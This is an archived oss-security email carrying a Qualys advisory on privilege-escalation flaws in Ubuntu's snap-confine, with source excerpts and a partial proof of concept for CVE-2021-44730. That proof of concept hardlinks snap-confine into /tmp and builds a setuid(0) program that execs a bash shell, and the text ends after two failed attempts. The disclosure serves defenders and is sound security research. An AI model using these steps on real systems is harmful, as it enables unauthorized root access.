X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["69435" "Thursday" "17" "February" "2022" "19:47:43" "+0000" "Qualys Security Advisory" "qsa@qualys.com" nil "1637" "[oss-security] CVE-2021-44731: Race condition in snap-confine's setup_private_mount()" nil nil nil "2" nil nil (number mark "U       qsa@qualys.c Feb 17 1637/69435 " thread-indent "\"[oss-security] CVE-2021-44731: Race condition in snap-confine's setup_private_mount()\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-44731: Race condition in snap-confine's setup_private_mount()" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26446 invoked by uid 550); 17 Feb 2022 19:48:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26412 invoked from network); 17 Feb 2022 19:48:00 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : content-id : content-transfer-encoding
 : mime-version; s=qualyscom;
 bh=WcA1xYSNDSsnDyrB/Z4WEGLCyfFs/0suRySV3FWDwxk=;
 b=BEoES/5niurS/7qP+w0zKV20XmvYChzmmlaujk8sKNQh35Xp3RyH43oa8ozTBsTX0cIr
 cBnmssvT332FlinyCmgJq73w02/mmTz4L3ZPX36JlKmnrA/Elytg9NnVyL+CKwT0eUr4
 G0jYruU3EjCKEcecELZ8RfEJ0j+VqTN76uWKXkjBQPS+p9KCMR8qx+21DOStEdwEAGf+
 gK1pR3vlMYXfmSIgSDqA8MPw7Sv4nZ3wqOPj8y7mz+EKWnZDAOUJ7j/kJstpPiMVi9mp
 4rFkDMxEjwXwEAHxdu4PB6aD/e44RLLuW9F1YS7f3jvERiFZpLMar64JDu4BJvgNMB0g Tg== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=qsa@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=NmYaofKLtAwUKJElUe+zpECWN1p30gY5Zkd2yAUnDRFNGV4UItXC1acYgwqhXaa0nx3NsS8jCYwnaUqBygP/xikvqMTpqdScDmY3Yo0AuRai21PBGrFB4LrTrj3iG26kh1EfoENXtAI5HK+iksS/x3KH/UjkZkj6IHVmJ1z3iIINY9yv6GJV8BAlW9Jic9hUlm1G1AYhVIi2QxgcJw3nSuXd5ZEQR0fpnsBAwjG+EMm0zRDT2DfohC0mi2RDBSiLYOsdyYf+ZTfF52YIWrD553VEb5/YwqQGFR208MxSImgHEma0ISPfJNGAs5qCYcX1+lzUBSS6wtqXfQUqRHcDyg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=WcA1xYSNDSsnDyrB/Z4WEGLCyfFs/0suRySV3FWDwxk=;
 b=MoUWrcfZyWaddLMiYEoHeE0SRtJVeFWhR4nV3xoAS8ug4Ph1MRbxULQmISphXqpzNfJjmOA/aQs+E25UnUsLyJXjwzKdnb9pRKptvbmDvScYPOu4VhjVowJJm1jJtkgeH13QGXE69bW+t2PIHcv5/BoOCBknZ/NNTQwmpul9ttPUYHNGDeDMt7Jg3X3GqWCxP3Sv1GF60sE3HbGJNr53r9c6NsaPlzc4AdQjgrODYGjqlQ4i4QRt+eQEPOK/MrJ/iv88I3K0ifZiuBMGuisUAbYPsnwHw2P6B1YxGXWG9xzNJqMEIulqnGvF9u0+ZdKxNxOrKBWTpHZXDhBG9S8J0g==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=WcA1xYSNDSsnDyrB/Z4WEGLCyfFs/0suRySV3FWDwxk=;
 b=kABVRnMHsDGGObLe2nndqD78+mS2l3mOGJG/Oh3j4009HPdUur2s3tjaYhq1UCEVhE7+GTAA881tBG0NiSRM7BCi52QgoMimFcfrXx20yws7hae8+Rps8yBg7KQN48scvyK8fiTJkPPTNjy43Pu0gV4jAZJNBEF7SUSpBBsrUtww+bK/9YwS6jyyK2pQpgqgZUVRkznPrgGuxHK0TE6OusQU06p/bW9RqRjpot5YsLWRetrYnL33DTRUge9NI9ShIAdZnv6VNPOODstFAlbDGDlgavVfxCX46aygaz79Gr10aNGeGVce6Lg1RE+BmcSAmdeUB6+fgBuvUi1TYNmrNQ==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2021-44731: Race condition in snap-confine's
 setup_private_mount()
Thread-Index: AQHYJDc6v7DwHgNS9EGmSmFRP3IDdA==
Date: Thu, 17 Feb 2022 19:47:43 +0000
Message-ID: <20220217194634.GA6345@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 99e0569e-3042-4d72-eca6-08d9f24e5d94
x-ms-traffictypediagnostic: BLAPR06MB6771:EE_
x-microsoft-antispam-prvs: 
 <BLAPR06MB6771DC7BDA3AF40316A8A282D5369@BLAPR06MB6771.namprd06.prod.outlook.com>
x-ms-oob-tlc-oobclassifiers: OLM:136;
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 NyDtTWS0QcMkAc7qOn/FGaeyU8vUQgFNRBZpZGpsoQBkhVj5Qkiq2gatZkhmp2w+dylPnQLjZKcksTwPeZkTH/ieQWyyg93yIS8WkbhRO/pqhYzVQN8Hz9rdfztzX84xyuO2YVAlcv1j8bXWDGq5M8ozODDxruFlDsfzuCnNSJi9RqmaO7y6iG4QI5s+v4n9LbR4gv7a7k4gnTxzWZ7VIsObLKvmDcIS3w4VrSaDlQpGMJDegbR2+XqudY2ctbt9X0RrUfHW6Sx6bGKCyrDKtsb9wJuUAC9CdR2CyU80Ab2vJhtJodxRUxCMuTzndscEhr5RWGNuiTvtiRDtIn/VTR03/udKkVGVA2WSaq+z0LBf0qY8I3yMEMcKuXuwY+bpQualbhyuuLOYKqQgsb/mTg2ghXg+EGcwLL4E0HBQT/1U5cYXcMu6zHOarzAA4RTjaCHNiKc1pBS/94lHEE8mwUWJ4f/STgRaL712bf6bCeDvcifPgqgjN5Pk0+Tnlzm20PAdtKNjGexzEkwWKxhOqGGgZgh6D0uCZ2ZiOgcVrJpakAPQShz1IP8i6/c9cy2hLCMfp6hXOLtwcl/Z+WnqdlhwK3RWbcW3EewczrqEAS4fsg9zoPLD/FXBzNV+E2HU2TG8MoZ8mAFzrZoH5oCkZtggALlMmAIXg67tkDRBWGwgAl3VjmntveQZJ+5CG7EEUHboFrfzhVabl04wmiVypP3Ws5kcwFw7HJFxtgIwyAEsQXIPO33aKV5KeDZEn1RcPS7MLM6dm9alAVB+Pwz1QZmIByE+qE9O6mBnMbLI8q0=
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230001)(366004)(83380400001)(966005)(2906002)(4001150100001)(8936002)(30864003)(5660300002)(508600001)(71200400001)(1076003)(9686003)(186003)(26005)(6512007)(6486002)(6506007)(33656002)(86362001)(122000001)(38070700005)(38100700002)(316002)(66476007)(66556008)(66446008)(64756008)(76116006)(66946007)(6916009)(8676002)(559001)(579004);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?DZ+4UhnHBOaQ/bPqyAppahRUeCjut+anz9pY75k3j1dH5rzJP6pDm+nIQzJv?=
 =?us-ascii?Q?EmNOa5FcWTwnFKNvxR++9/HRKxvNoMcTrKRgkEtAaQlAXoPHFAD9LqD3Kns6?=
 =?us-ascii?Q?YeBmVvEcOcxtRQLn843IROS0++6FZequ4+PllojFiEuSVXf93KCqWiqXIq2X?=
 =?us-ascii?Q?o8JKEznXlD53lXke95m7PYrRDGemIeZLoJujh5FATuXEspc1CZBbg2klLaKM?=
 =?us-ascii?Q?4JPns8xE3vtQ5uPd2R5ev0Y9RX8jARjYk+kac4d+vYMTQF3/AVlIV8D4dm0a?=
 =?us-ascii?Q?842QLFostMd7alMSKUhI9IbBKwR4r4S+O+iy6FaRQrXzr13WwIXJSwlmKAK0?=
 =?us-ascii?Q?wHMNvDXDX1/wvc9T6r6D2A/GaFwgQbKr1inPUQpSQhDu3R3PqLOUFzwofIVE?=
 =?us-ascii?Q?c5X9Aaz4uh7/ltVD2BScQ8snCG4slQTwUsG/cPsALP9tQtjVCimKN2qwLbUB?=
 =?us-ascii?Q?tygug3zeUbXoSwhWVpv6N6vGN1ic8zIMBzTqHE9keUNmf8Fq10dNRQ8oTvyV?=
 =?us-ascii?Q?2NN7zNgjLsUN02WuFfVts8kR+hLZ1GLkzCzc1uN+Ar1F2256XYX2xUf6xUKu?=
 =?us-ascii?Q?+C4o27KGtqpGs8eO3kelUqxRcg7QeMoicc0KKTz965Nz7zHfW5GOR5kp/tIZ?=
 =?us-ascii?Q?VQ6zr3MoQQshjd/XZeFYrNFo8sOieTbyt4PSIfJvE4dKk115Gb4U72m5axzT?=
 =?us-ascii?Q?hYqfcEDufiXBAXXC4TIeurLE+gUTwP4gevuz4eDcQapz609a/QwzESkSGOhr?=
 =?us-ascii?Q?PktY4jgfoKdtxFN0HCC/ir+727dLRK3K4KTQQsgKuEYKC5qz+TUQ4bhk5mn3?=
 =?us-ascii?Q?y9VT0j7CqIDlY5RvbwMiMBkgYPMzmGmjwXoCsxOBcViAjxgJCsCa6euFUsbl?=
 =?us-ascii?Q?oF+MbMpm2O7Pbup5LB6TmFibMmAWTvvKTHz8oEDuFxiOTYf+hEi71sMzWkFY?=
 =?us-ascii?Q?GUoOi4N003xawQP9ke4IXi3pmdiKpihke9QsZeW1o9VszjWbRDhOynRe6Zl3?=
 =?us-ascii?Q?VNvQQYBBQ/lBk6Tgy7mVCscxL+vU35wDSvcVit/GqGF947UkFt5IJRRIm2kn?=
 =?us-ascii?Q?mDqgKCnO4QjwqMS/q+dbNYpbgalht6pkAfYtKPFFJGP2gw1rO+Ozb/e0u3jv?=
 =?us-ascii?Q?AfcI8SDGJp6ZlleNyWMxMGshtG0/cSRvRPSPTeSH9oNshaCPM9lGaY4xHzZg?=
 =?us-ascii?Q?FPhrtjiE+WRXYI5FqsutrswNxyp07CkSxSYtgjQvZSIbPrbHoqSO+nDdO8Ij?=
 =?us-ascii?Q?W5YAmpr//bPptR4AiCL7OW9LaVbd5Dxnb5oB2oK6ZgqcDI1AHzRmiruy4Whv?=
 =?us-ascii?Q?jJgMdn6ALdY2LtfE4NVKGwUAW6ZodTUxxsnzrfOZp0kjG8g3Rwrg9EXAXCy3?=
 =?us-ascii?Q?BmPl+3E4SBqY3MEX/J9WGrfXGuSK1lqKvsFJUk7ebq2UG2lLKq+ddUdaCmQa?=
 =?us-ascii?Q?YrtkvdHy6Ksui0+8je9SZ+04q297dv7bdalQ0v2kYPPZBPm3CXoScL3pRzWH?=
 =?us-ascii?Q?+poPHvdiFu205UWAfFmYmByNRvhx6CPs0QVf5/vFVUPZHUWYC/hgbJsHb38o?=
 =?us-ascii?Q?CnomIWYWV2PM671ZY2x4MTytzUg+7Dtb9QOtUPFgRveWntQGrn84ZpxcO7gP?=
 =?us-ascii?Q?As4URXtnrZioY3DSMQ9JO0vuqC7MvknYvm8gCUNi/uo9lMHtN8ZCd580MG3u?=
 =?us-ascii?Q?/4wo5Syj0zI/TZOHxg1D2JQJTGY=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <57CE596C72C15C4A8A5F659956DDE1D6@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 99e0569e-3042-4d72-eca6-08d9f24e5d94
X-MS-Exchange-CrossTenant-originalarrivaltime: 17 Feb 2022 19:47:43.8247
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: Yvh3x7ZvGfO66edDRVqJt7wYnVXP2rQMR/8Xh34r8dsep/aAg0p7ozBa2AN9thG66koEw+k7cM/yYcIF6lms9aHhfjdSyu3zpdA5+K5lbZ8=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: BLAPR06MB6771
X-Proofpoint-ORIG-GUID: lbL4h2Bn4bAG-jZlUatQwhUFtiMc7wnY
X-Proofpoint-GUID: lbL4h2Bn4bAG-jZlUatQwhUFtiMc7wnY
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:_spf.salesforce.com include:mktomail.com
 include:emailus.freshservice.com a:sendgrid.avolio.tech ~all
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.205,Aquarius:18.0.816,Hydra:6.0.425,FMLib:17.11.62.513
 definitions=2022-02-17_07,2022-02-17_01,2021-12-02_01
X-Proofpoint-Spam-Reason: safe
Subject: [oss-security] CVE-2021-44731: Race condition in snap-confine's
 setup_private_mount()


Qualys Security Advisory

Oh Snap! More Lemmings (Local Privilege Escalation in snap-confine)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Two minor bugs
An unexploitable bug
CVE-2021-44730: Hardlink attack in snap-confine's sc_open_snapd_tool()
CVE-2021-44731: Race condition in snap-confine's setup_private_mount()
- Case study: Ubuntu Server, near-default installation
- Case study: Ubuntu Desktop, default installation
CVE-2021-3996: Unauthorized unmount in util-linux's libmount
CVE-2021-3995: Unauthorized unmount in util-linux's libmount
CVE-2021-3998: Unexpected return value from glibc's realpath()
CVE-2021-3999: Off-by-one buffer overflow/underflow in glibc's getcwd()
CVE-2021-3997: Uncontrolled recursion in systemd's systemd-tmpfiles
Acknowledgments
Timeline


  "Some of the new puzzles are superb and will have you scratching your
  head for some time as you check out all the possible routes and find
  most of them are red herrings."
    -- John Sweeney (1992). "Oh No! More Lemmings". New Atari User (55).


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We recently audited snap-confine (a SUID-root program that is installed
by default on Ubuntu) and discovered two vulnerabilities (two Local
Privilege Escalations, from any user to root): CVE-2021-44730 and
CVE-2021-44731.

  "Snap is a software packaging and deployment system developed by
  Canonical for operating systems that use the Linux kernel. The
  packages, called snaps, and the tool for using them, snapd, work
  across a range of Linux distributions and allow upstream software
  developers to distribute their applications directly to users. Snaps
  are self-contained applications running in a sandbox with mediated
  access to the host system." (Wikipedia)

  "snap-confine is a program used internally by snapd to construct the
  execution environment for snap applications." (man snap-confine)

Discovering and exploiting a vulnerability in snap-confine has been
extremely challenging (especially in a default installation of Ubuntu),
because snap-confine uses a very defensive programming style, AppArmor
profiles, seccomp filters, mount namespaces, and two Go helper programs.
Eventually, we discovered two vulnerabilities:

- CVE-2021-44730, a hardlink attack that is exploitable in a non-default
  configuration only (when the kernel's fs.protected_hardlinks is 0);

- CVE-2021-44731, a race condition that is exploitable in default
  installations of Ubuntu Desktop, and near-default installations of
  Ubuntu Server (the default installation, plus one of the "Featured
  Server Snaps" that are offered during the installation; for example,
  "heroku" or "microk8s").

While working on snap-confine, we also discovered several
vulnerabilities in related packages and libraries: CVE-2021-3996 and
CVE-2021-3995 in util-linux (libmount and umount), CVE-2021-3998 and
CVE-2021-3999 in the glibc (realpath() and getcwd()), and CVE-2021-3997
in systemd (systemd-tmpfiles). We partially published these secondary
vulnerabilities in January 2022, shortly after their patches became
available:

  https://www.openwall.com/lists/oss-security/2022/01/10/2
  https://www.openwall.com/lists/oss-security/2022/01/24/2
  https://www.openwall.com/lists/oss-security/2022/01/24/4

If you enjoy puzzle games like Lemmings (which turns 31 this year!),
then we hope that you will enjoy this advisory.



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Two minor bugs
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Don't let your eyes deceive you
        -- Lemmings, Fun Level 15

We almost abandoned our audit after a few days, because snap-confine is
programmed very defensively, and it has been thoroughly reviewed before
(by Matthias Gerstner of the SUSE Security Team):

  https://www.openwall.com/lists/oss-security/2019/04/18/4
  https://bugzilla.suse.com/show_bug.cgi?id=3D1127368

Nevertheless, we decided to continue our audit because we spotted two
minor bugs (probably typos) and began to suspect that nastier bugs might
be hiding in snap-confine. Both minor bugs are located in the main()
function:

------------------------------------------------------------------------
433         sc_identity real_user_identity =3D {
434                 .uid =3D real_uid,
435                 .gid =3D real_gid,
436                 .change_uid =3D 1,
437                 .change_gid =3D 1,
438         };
439         sc_set_effective_identity(real_user_identity);
...
466         if (getresuid(&real_uid, &effective_uid, &saved_uid) !=3D 0) {
467                 die("getresuid failed");
468         }
...
494         // Permanently drop if not root
495         if (effective_uid =3D=3D 0) {
...
498                 if (setgid(real_gid) !=3D 0)
499                         die("setgid failed");
500                 if (setuid(real_uid) !=3D 0)
501                         die("setuid failed");
502=20
503                 if (real_gid !=3D 0 && (getuid() =3D=3D 0 || geteuid() =
=3D=3D 0))
504                         die("permanently dropping privs did not work");
505                 if (real_uid !=3D 0 && (getgid() =3D=3D 0 || getegid() =
=3D=3D 0))
506                         die("permanently dropping privs did not work");
507         }
...
542         execv(invocation.executable, (char *const *)&argv[0]);
------------------------------------------------------------------------

The "real_gid" at line 503 should be "real_uid", and the "real_uid" at
line 505 should be "real_gid". This first bug does not have dangerous
consequences, because the lines 503-506 are basically defense-in-depth
checks: the lines 498-501 have already checked that the root privileges
were dropped successfully.

Moreover, the second minor bug prevents snap-confine from actually
entering the code block at lines 495-507: the effective_uid at line 495
is in fact not 0 anymore, because the effective uid was set to the real,
unprivileged uid at lines 433-439, and the effective_uid variable was
set to this unprivileged uid at lines 466-468.

This second bug may seem serious at first glance, because it prevents
snap-confine from calling the privilege-dropping functions setuid() and
setgid() (at lines 498-501) before a user-controlled program is executed
(at line 542). In reality this does not have dangerous consequences: the
only remaining privileged uid (the saved uid) is automatically reset to
the effective, unprivileged uid by the execve() syscall (at line 542).

Despite their practical uselessness, these two minor bugs motivated us
to continue our audit, and we are deeply grateful to them.



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
An unexploitable bug
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    DON'T PANIC
        -- Oh No! More Lemmings, Crazy Level 19

We also discovered a minor bug in the sc_call_snap_update_ns_as_user()
function:

------------------------------------------------------------------------
112         const char *xdg_runtime_dir =3D getenv("XDG_RUNTIME_DIR");
113         char xdg_runtime_dir_env[PATH_MAX + strlen("XDG_RUNTIME_DIR=3D"=
)];
114         if (xdg_runtime_dir !=3D NULL) {
115                 sc_must_snprintf(xdg_runtime_dir_env,
116                                  sizeof(xdg_runtime_dir_env),
117                                  "XDG_RUNTIME_DIR=3D%s", xdg_runtime_di=
r);
118         }
...
127         char *envp[] =3D {
...
132                 xdg_runtime_dir_env, NULL
133         };
134         sc_call_snapd_tool_with_apparmor(snap_update_ns_fd,
135                                          "snap-update-ns", apparmor,
136                                          aa_profile, argv, envp);
------------------------------------------------------------------------

If we execute snap-confine without an XDG_RUNTIME_DIR environment
variable, then the stack-based buffer xdg_runtime_dir_env[] is not
initialized (lines 112-118), and the uninitialized contents of this
buffer are passed as an environment variable to snap-update-ns (lines
127-136), a helper program that is executed with root privileges.

This bug may also seem serious at first glance (because we may be able
to control the contents of this uninitialized buffer), but we do not
believe that it is exploitable:

- snap-update-ns is a statically-linked Go program, and therefore does
  not process most of the "unsecure" environment variables (LD_PRELOAD,
  LD_AUDIT, etc);

- snap-update-ns is executed with effective uid 0 but unprivileged real
  uid (like a SUID-root program), and therefore runs in "secure" mode
  (__libc_enable_secure);

- snap-update-ns calls clearenv() in its bootstrap function, and thereby
  erases all environment variables (another layer of defense in depth).

More importantly, the size of sc_call_snap_update_ns_as_user()'s stack
frame (which contains the uninitialized buffer xdg_runtime_dir_env[]) is
~8KB, but the stack-frame size of sc_do_mount() (which is called before
sc_call_snap_update_ns_as_user()) is ~10KB and is filled with zeros. In
other words, xdg_runtime_dir_env[] is indirectly filled with zeros (by
sc_do_mount()) and we cannot pass an arbitrary environment variable to
snap-update-ns (just an empty environment variable).



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-44730: Hardlink attack in snap-confine's sc_open_snapd_tool()
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Easy when you know how
        -- Lemmings, Fun Level 17

snap-confine dynamically obtains the path to snap-update-ns and
snap-discard-ns (two helper programs that are executed with root
privileges) by reading its own path via /proc/self/exe (at line 166), by
opening this path's directory (at line 174), and by opening the helper
program inside this directory (at line 179) -- this helper program is
later executed via fexecve():

------------------------------------------------------------------------
 69 int sc_open_snap_update_ns(void)
 70 {
 71         return sc_open_snapd_tool("snap-update-ns");
 72 }
------------------------------------------------------------------------
139 int sc_open_snap_discard_ns(void)
140 {
141         return sc_open_snapd_tool("snap-discard-ns");
142 }
------------------------------------------------------------------------
160 static int sc_open_snapd_tool(const char *tool_name)
161 {
...
166         if (readlink("/proc/self/exe", buf, sizeof buf) < 0) {
...
172         char *dir_name =3D dirname(buf);
...
174         dir_fd =3D open(dir_name, O_PATH | O_DIRECTORY | O_NOFOLLOW | O=
_CLOEXEC);
...
179         tool_fd =3D openat(dir_fd, tool_name, O_PATH | O_NOFOLLOW | O_C=
LOEXEC);
...
184         return tool_fd;
185 }
------------------------------------------------------------------------

Unfortunately, if we are able to hardlink snap-confine into a directory
that we own, and if we execute this hardlink, then snap-confine will
open our directory and execute our own, arbitrary snap-update-ns and
snap-discard-ns programs, as root.

Important note: this is impossible in a default configuration (although
the kernel's fs.protected_hardlinks is 0 by default, the distributions
set this sysctl to 1 by default). Consequently, in the following proof
of concept, we exploit a default installation of Ubuntu Server whose
fs.protected_hardlinks sysctl has been manually reset to 0.

________________________________________________________________________

First, failed attempt
________________________________________________________________________

First, as an unprivileged user, we make sure that the "lxd" snap (the
only snap installed by default on Ubuntu Server) has been started
(although it should have been started automatically at boot time):

------------------------------------------------------------------------
$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane)

$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd /usr/lib/snapd/snap-confi=
ne --base core18 snap.lxd.daemon /nonexistent
...
------------------------------------------------------------------------

Next, we hardlink snap-confine into a directory in /tmp, and (in the
same directory) we create a simple snap-discard-ns program that should
eventually be executed as root:

------------------------------------------------------------------------
$ mkdir -m 0700 /tmp/.tmp
$ cd /tmp/.tmp
$ ln -i /usr/lib/snapd/snap-confine ./
$ cp -i "$(which true)" snap-update-ns

$ cat > snap-discard-ns.c << "EOF"
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    if (setuid(0)) _exit(__LINE__);
    if (setgid(0)) _exit(__LINE__);

    char * const argv[] =3D { "/bin/bash", "-c", "id; cat /proc/self/attr/c=
urrent", NULL };
    execve(*argv, argv, NULL);
    _exit(__LINE__);
}
EOF
$ gcc -o snap-discard-ns snap-discard-ns.c
------------------------------------------------------------------------

Last, we execute our hardlinked snap-confine with a different base
("snapd" instead of "core18"), which forces snap-confine to restart the
"lxd" snap and therefore to execute our own snap-discard-ns program:

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd ./snap-confine --base sna=
pd snap.lxd.daemon /nonexistent
...
DEBUG: apparmor label on snap-confine is: unconfined
DEBUG: apparmor mode is: (null)
snap-confine has elevated permissions and is not confined but should be. Re=
fusing to continue to avoid permission escalation attacks
------------------------------------------------------------------------

This first attempt failed: snap-confine exited because it detected that
it was "unconfined" -- it is normally confined by an AppArmor profile
named "/usr/lib/snapd/snap-confine", which was not applied here because
we executed /tmp/.tmp/snap-confine, not /usr/lib/snapd/snap-confine.

________________________________________________________________________

Second, failed attempt
________________________________________________________________________

To solve this first problem, we force snap-confine's AppArmor profile on
/tmp/.tmp/snap-confine, by wrapping its execution in aa-exec (a tool for
confining a program with an AppArmor profile):

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=3D1 SNAP_INSTANCE_NAME=3Dlxd aa-exec -p /usr/lib/snapd=
/snap-confine -- ./snap-confine --base snapd snap.lxd.daemon /nonexistent
...
cannot execute snapd tool snap-discard-ns: Permission denied
snap-discard-ns failed with code 1
------------------------------------------------------------------------

